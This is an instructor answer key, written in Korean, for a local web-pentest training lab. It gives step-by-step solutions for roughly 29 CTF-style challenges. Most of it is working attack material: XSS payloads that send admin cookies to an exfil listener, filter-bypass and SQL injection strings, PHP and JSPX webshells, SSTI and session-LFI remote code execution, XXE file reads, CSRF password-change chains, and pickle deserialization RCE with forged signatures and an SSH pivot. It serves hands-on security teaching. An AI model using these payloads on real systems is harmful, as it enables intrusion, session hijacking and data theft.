# web-pentest-edu — 전체 문제 풀이 (강사용 정답지)

> 인-레포 26문제 + 외부 GitHub 챌린지 3종(authbypass-basic/advanced·secret-tunnel). 인-레포 26문제는 로컬 도커 기동 상태에서 **실제 익스플로잇으로 flag 획득까지 검증**됨.
> 스크립트가 필요한 문제는 이 폴더의 `.py` 사용. 외부 3종은 소스 분석 기반 풀이(맨 아래 [외부 GitHub 챌린지](#외부-github-챌린지) 절).

## 0. 준비

```powershell
# 1) 실습 환경 기동 (루트에서)
.\start.ps1

# 2) (client 문제 공용) exfil 수신 서버 — 별도 터미널에서 켜둔다
python solution\exfil_server.py            # host:8000 수신
```

- **client(봇) 문제의 report URL 은 반드시 서비스명**: `http://xss-1:9101/board/<seq>` (localhost 금지 → 봇이 엉뚱한 오리진에 로그인/방문).
- 쿠키·데이터 외부 수신은 `host.docker.internal:<port>` (봇 컨테이너 → 호스트).
- 아래 `curl` 예시는 **Git Bash** 기준. **PowerShell 이면 `curl` → `curl.exe`** 로 바꿔 쓰거나, OS 무관한 `.py` 스크립트를 사용.
- 봇 동작 확인: `docker logs bot`.

| 스크립트 | 대상 문제 |
|---|---|
| `exfil_server.py` | (공용 수신) xss-1/2/3 · domclobbering · prototype-pollution |
| `sqli3_blind.py` | sqli-3 |
| `cmdi_oob.py` | cmdi-1 |
| `race_transfer.py` | race-transfer |
| `xss_exploit.py` | xss-1 · xss-2 · xss-3 |
| `csrf_exploit.py` | csrf-1 · csrf-2 |
| `client_misc.py` | domclobbering · prototype-pollution |
| `xsleak_server.py` + `xsleak_solve.py` | xsleak |

---

## 인증 · 인가

### idor-balance (:9301) — IDOR
- **취약점**: 계좌 조회가 `acct` 파라미터만으로 동작, 세션 소유자 검증 없음. admin 계좌(1000) 메모에 flag.
- **풀이**: guest 로그인 후 자기 계좌(1001)가 아닌 **1000** 을 조회.
```bash
curl -s -c c.txt -d 'u=guest&p=guest' http://localhost:9301/login
curl -s -b c.txt 'http://localhost:9301/balance?acct=1000'
# → 계좌 1000 · 잔액 … · 메모: flag{...}
```

### 2fa-bypass (:9302) — 2차인증 검증 우회
- **취약점**: 비번 단계 후 `stage='otp'`. 그러나 `/secret` 이 `'done'` 이 아니라 `'otp'` 도 허용.
- **풀이**: 로그인 직후 OTP 생략하고 `/secret` 직접 접근.
```bash
curl -s -c c.txt -d 'u=guest&p=guest' http://localhost:9302/login
curl -s -b c.txt http://localhost:9302/secret
# → 기밀: flag{...}
```

---

## 클라이언트 사이드

### xss-1 (:9101) — 기본 반사형 (쿠키 탈취)
- **취약점**: 본문이 escape 없이 출력(Stored XSS). admin 봇은 flag 를 쿠키로 보유.
- **풀이**: `python solution\xss_exploit.py xss-1` → `exfil_server` 에 `?xss1=flag=flag{...}` 수신.
- **payload**(글 본문):
```html
<script>new Image().src='http://host.docker.internal:8000/?xss1='+encodeURIComponent(document.cookie)</script>
```

### xss-2 (:9102) — 필터 우회
- **취약점**: `script·on·( )·'·javascript` 차단. HTML 엔티티 + iframe javascript: 로 우회. flag 는 admin 쿠키.
- **풀이**: `python solution\xss_exploit.py xss-2` → `?xss2=<base64>` 수신 → base64 디코딩.
- **payload**:
```html
sad<iframe src="javas&#x63;ript:fetch&#x28;&#x27;http://host.docker.internal:8000/?xss2=&#x27;+btoa&#x28;document.cookie&#x29;&#x29;">
```

### xss-3 (:9103) — 내부글 읽기
- **취약점**: `fetch·eval·constructor·( )·'·"` 차단. flag 는 admin 글(`/board/0`).
- **풀이**: `python solution\xss_exploit.py xss-3` → `?xss3=<HTML>` 수신 → `flag{...}` 추출. 괄호는 전부 `\x28/\x29`, 실행은 `Set.constructor` 백틱 태그드 템플릿.
- **payload**:
```html
<script>Set[`co`+`nst`+`ructor`]`f\x65tch\x28\x27/board/0\x27\x29.then\x28e=>e.text\x28\x29\x29.then\x28e=>{f\x65tch\x28\x27http://host.docker.internal:8000/?xss3=\x27+encodeURIComp\x6fnent\x28e\x29\x29}\x29```</script>
```

### csrf-1 (:9104) — 비밀번호 변경
- **취약점**: 마크다운 이미지 `![alt](url)` → `<img src=url>`. admin changepw 는 내부(봇)에서만.
- **풀이**: `python solution\csrf_exploit.py csrf-1` → 봇이 admin 비번을 `pwned123` 으로 변경 → admin 로그인해 `/board/0` 의 flag 읽기.
- **payload**(글 본문): `![x](/changepw?userid=admin&userpw=pwned123)`

### csrf-2 (:9105) — 토큰 누출 체이닝
- **취약점**: changepw 에 세션 `csrf_token` 필요 → XSS 로 토큰 누출 후 호출.
- **풀이**: `python solution\csrf_exploit.py csrf-2` → admin 비번 `haha2026` → `/board/0`.
- **payload**:
```html
<script>window[`f\x65tch`](`/changepw`).then(e=>e.text()).then(e=>{idx=e.indexOf(`csrf_token`)+19;tok=e.slice(idx,idx+32);window[`f\x65tch`](`/changepw?userid=admin&userpw=haha2026&csrf_token=`+tok)})</script>
```

### xsleak (:9106) — CSS Injection XS-Leak
- **취약점**: admin 이 보면 `href="javascript:alert('flag…')"` 렌더. script 차단·style 허용 → 속성선택자로 한 글자씩 누출.
- **풀이**(2 터미널):
```powershell
python solution\xsleak_server.py     # 터미널 A: 공격 CSS 서버(host:8001)
python solution\xsleak_solve.py      # 터미널 B: @import 주입 + 반복 신고 → flag 복원
```
- **주입**(글 본문): `<style>@import url("//host.docker.internal:8001/leak.css");</style>`

### domclobbering (:9107) — DOM Clobbering
- **취약점**: `window.CLOB.isAdmin` 참이면 `eval(c)`. HTML 주입으로 클로버링. flag 는 `#flag`(봇·내부일 때).
- **풀이**: `python solution\client_misc.py domclobbering` → `exfil_server` 에 `?dc=flag{...}`.
- **payload**(`?c=`): 따옴표/슬래시 차단 → 정규식 `.source`·`fromCharCode` 우회
```
/<form id=CLOB><input id=isAdmin>/;_=String.fromCharCode(0x2f);fetch(/http:/.source+_+_+/host.docker.internal:8000?dc=/.source+flag.innerText)
```

### open-redirect (:9108) — Open Redirect (봇 불필요)
- **취약점**: `is_safe` = `'/'` 시작 또는 `'localhost'` 포함이면 통과. 'localhost' 를 경로에 끼우고 실제 host 는 외부로.
```bash
curl -s "http://localhost:9108/go?next=http://evil.com/localhost"
# → open redirect 성공! flag{...}
```

---

## 서버 사이드 (인젝션)

### sqli-1 (:9201) — 기본
- **취약점**: 입력이 쿼리에 그대로 결합. admin 반환 시 flag.
```bash
curl -s "http://localhost:9201/?userid=admin%27--%20-&userpw=x"
```

### sqli-2 (:9202) — 필터 우회
- **취약점**: WAF(공백·or·admin·숫자 차단). 공백=`%0a`, admin=`concat('ad','min')`.
```bash
curl -s "http://localhost:9202/?userid=a%27%3D%27a%27%23%0aand%23%0auserid%3Dconcat(%27ad%27,%27min%27)%23&userpw=x"
```

### sqli-3 (:9203) — Blind
- **취약점**: 응답이 admin/실패만(Blind). 숫자 차단 → `length('a..')`, 비교 → `ascii()` 이진탐색.
```powershell
python solution\sqli3_blind.py        # admin 비밀번호(=flag) 자동 복원
```

### lfi-1 (:9204) — php filter
- **취약점**: `?p=` 임의 파일 include. filter 로 소스를 base64.
```bash
b=$(curl -s "http://localhost:9204/?p=php://filter/convert.base64-encode/resource=lfiflag.php" | grep -oE '[A-Za-z0-9+/=]{20,}' | head -1)
echo "$b" | base64 -d        # → <?php $flag="flag{...}";
```

### lfi-2 (:9205) — 세션 RCE
- **취약점**: 입력이 세션에 저장 + 세션파일 LFI include 가능. `/readflag`(실행전용) RCE 필요.
- **주의**: PHP 8 — `$_GET[c]` 는 Fatal, 따옴표 필수(`$_GET['c']`).
```bash
SID=pwn
curl -s -b "PHPSESSID=$SID" "http://localhost:9205/?p=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%3F%3E" -o /dev/null
curl -s -b "PHPSESSID=$SID" "http://localhost:9205/?p=/tmp/sess_$SID&c=/readflag"
# → flag{...}
```

### cmdi-1 (:9206) — Command Injection (Blind)
- **취약점**: shell 실행되나 출력 미반환. flag 는 `/command_injection_flag.txt`.
```powershell
python solution\cmdi_oob.py            # TCP 리스너 자동 + OOB 유출 → flag 출력
```

### ssti-1 (:9207) — SSTI → RCE
- **취약점**: `name` 이 `render_template_string` 에 결합 → RCE.
```bash
curl -s "http://localhost:9207/?name=%7B%7Bcycler.__init__.__globals__.os.popen('cat%20/flag.txt').read()%7D%7D"
```

### xxe-1 (:9208) — XXE
- **취약점**: 외부 엔티티 확장 허용 → 파일 읽기.
```bash
printf '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag.txt">]>\n<order><name>&xxe;</name></order>' > x.xml
curl -s -XPOST --data-binary @x.xml http://localhost:9208/order
# → 주문자: flag{...}
```

### upload-webshell (:9501) — File Upload → 웹쉘
- **취약점**: `.php` 만 차단 → `.phtml` 우회(서버가 PHP 로 실행). flag 는 `/flag_upload.txt`.
```bash
printf '<?php system($_GET[0]); ?>' > shell.phtml
curl -s -F "f=@shell.phtml" http://localhost:9501/ >/dev/null
curl -s "http://localhost:9501/uploads/shell.phtml?0=cat%20/flag_upload.txt"
```

### ssrf-internal (:9502) — SSRF
- **취약점**: 입력 URL 을 서버가 대신 요청. `/internal/flag` 는 localhost 만 허용.
```bash
curl -s "http://localhost:9502/fetch?url=http://127.0.0.1:9502/internal/flag"
```

### prototype-pollution (:9503) — Prototype Pollution
- **취약점**: `merge` 가 `__proto__` 병합 → `isAdmin` 오염 → `eval(code)`. flag 는 `#flag`(봇·내부).
- **풀이**: `python solution\client_misc.py prototype-pollution` → `exfil_server` 에 `?pp=flag{...}`.
- **payload**(`?c=`): `{"__proto__":{"isAdmin":true,"code":"fetch('http://host.docker.internal:8000?pp='+flag.innerText)"}}`

---

## 서버 사이드 (JSP / Java)

### jsp-sqli (:9601) — SQL Injection
```bash
curl -s "http://localhost:9601/login.jsp?userid=admin%27--%20-&userpw=x"
```

### jsp-upload (:9602) — File Upload (.jspx 우회)
- **취약점**: `.jsp` 로 끝나는 이름만 차단 → `.jspx`(JSP document) 통과·실행. flag `/flag`.
```bash
cat > shell.jspx <<'EOF'
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("c")).getInputStream();
  byte[] b = new byte[in.available()]; in.read(b); out.println(new String(b));
</jsp:scriptlet>
</jsp:root>
EOF
curl -s -F "f=@shell.jspx" http://localhost:9602/upload >/dev/null
curl -s "http://localhost:9602/uploads/shell.jspx?c=cat%20/flag"
```

### jsp-pathtraversal (:9603) — Path Traversal
- **취약점**: `download.jsp` 경로검증 없음. base=`/files/` → `../WEB-INF` 접근(직접접근 불가).
```bash
curl -s "http://localhost:9603/download.jsp?file=../WEB-INF/flag.txt"
```

---

## 캡스톤

### jsp-chain (:9711) — JSP 체인 (PathTraversal → 정보노출 → 인증우회 RCE)
- **취약점**: `download` 경로조작으로 WEB-INF 유출 → 클래스 디컴파일로 하드코딩 키(`OPS_KEY`) 획득 → 숨은 운영 엔드포인트 RCE.
```bash
# 1) 숨은 매핑 확인
curl -s "http://localhost:9711/download?file=WEB-INF/web.xml"        # /sys/exec-9f3a (com.corp.AdminServlet)
# 2) 클래스 받아 키 추출 (디컴파일 대신 strings 로도 노출)
curl -s "http://localhost:9711/download?file=WEB-INF/classes/com/corp/AdminServlet.class" -o Admin.class
strings Admin.class | grep -i zx9     # OPS_KEY = Zx9_d3c0mp1l3_th1s_k3y_2026
# 3) 인증 RCE
curl -s "http://localhost:9711/sys/exec-9f3a?key=Zx9_d3c0mp1l3_th1s_k3y_2026&cmd=cat%20/flag"
# → flag{...}
```

---

## 외부 GitHub 챌린지

> 각자 own docker-compose. `start.ps1` 기본 기동(또는 `setup_external.ps1` 후 각 폴더 `docker compose up`).
> 풀이는 소스(`challenges/auth/authbypass-*/app/app.py`, `challenges/capstone/secret-tunnel/src/`) 분석 기반.

### authbypass-basic (:9001) — 은행 인증우회 (간편비밀번호 등록 결함)  ✓ 실익스플로잇 검증됨
- **취약점**: `register_simplepass` 가 **폼의 `userid`** 로 간편비밀번호를 등록(세션 사용자 아님) → admin 의 간편비번을 공격자가 설정 가능. `/getflag` 는 잔액>10억일 때 flag(admin 잔액은 천문학적).
- **풀이**:
```
1) 가입·로그인 (POST /register, POST /login)
2) 내 휴대폰번호 확인(/my) → SMS 인증 통과:
   GET /api/send_authmsg?phonenum=<내 폰>      # 인증코드 발송
   GET /api/get_sms_msg?phonenum=<내 폰>       # 코드 읽기
   POST /smsauth  (userid=<나>&phonenum=<내 폰>&authnum=<코드>)   # 2factor_success
3) admin 간편비번 등록(핵심 — userid=admin):
   POST /register_simplepass  userid=admin&simplepass1=123456&simplepass2=123456
   → 응답의 localStorage.setItem('simplepass_key','<KEY>') 에서 KEY 확보
4) admin 으로 간편로그인:
   POST /login_simplepass  simplepass_key=<KEY>&simplepass=123456
5) GET /getflag  → flag{...}   (admin 잔액 > 10억)
```
- **대응**: 간편비번 등록을 인증된 세션 사용자(`session['userid']`)로만 허용.

### authbypass-advanced (:9005) — 강화판 (SMS + 계좌 1원 다중인증)
- **변경점**: basic 우회 패치(`register_simplepass` 의 userid 가 `session['authid']` 로 고정) + **SMS·계좌1원 2중 인증** 추가.
- **취약점(핵심)**: 인증 대상(`authid` = `register_simplepass?userid=` 인자)과 인증요소가 느슨하게 묶이고, **1원 입금 인증코드가 거래내역에 `계좌인증(XXXX)` 로 그대로 노출**(`transfer_history`).
- **풀이(개요)**:
```
1) GET /register_simplepass?userid=admin           # authid=admin 지정
2) SMS 인증 우회(messages 흐름) → /smsauth 통과 → /acctauth 로 이동
3) 계좌 1원 인증: send_acctauth 가 내 계좌에 1원 입금(from_address=4자리 코드).
   /transfer_history 에서 '계좌인증(XXXX)' 4자리 코드 확인 →
   POST /acctauth  authnum=<XXXX>                  # acctauth_success
4) POST /register_simplepass  simplepass1=123456&simplepass2=123456  # admin 간편비번 등록
5) POST /login_simplepass → admin → GET /getflag → flag{...}
```
- **대응**: 각 인증요소를 인증 대상(세션)과 강하게 바인딩 · 인증코드 비노출.

### secret-tunnel (:8090, SSH :2222) — 캡스톤 (역직렬화 RCE → SSH 피벗)
- **취약점**: `extserver` `/process` 가 서명검증 후 `pickle.loads(base64decode(data))` → **역직렬화 RCE**. 서명키 `SECRET_KEY="very_secret_key_do_not_guess"` 가 소스에 하드코딩 → `md5(data+KEY)` 로 **서명 위조 가능**.
- **풀이(체인)**:
```
1) 위조 서명 + 악성 pickle 으로 RCE:
   data = base64( pickle.dumps(<__reduce__ 로 명령 실행하는 객체>) )   # 문자열 'pickle' 만 회피
   sig  = md5(data + "very_secret_key_do_not_guess").hexdigest()
   POST /process   data=<data>&signature=<sig>     → extserver 에서 명령 실행
2) extserver 의 SSH 키(id_rsa)로 intserver 피벗(SSH 터널):
   ssh -i id_rsa ... intserver   (extserver↔intserver)
3) intserver 에서 내부전용 flagserver 접근(internal_network) → /flag.txt
```
- **대응**: 신뢰경계 입력에 pickle 금지(JSON/안전한 포맷) · 서명키 비공개 · 내부망 접근통제.

---

## 정리

```powershell
.\start.ps1 -Down        # 전체 정리 (외부 챌린지 포함)
```
획득한 `flag{...}` 는 스코어보드(`http://localhost:9000`) 로그인 후 제출 → solved·랭킹 반영.
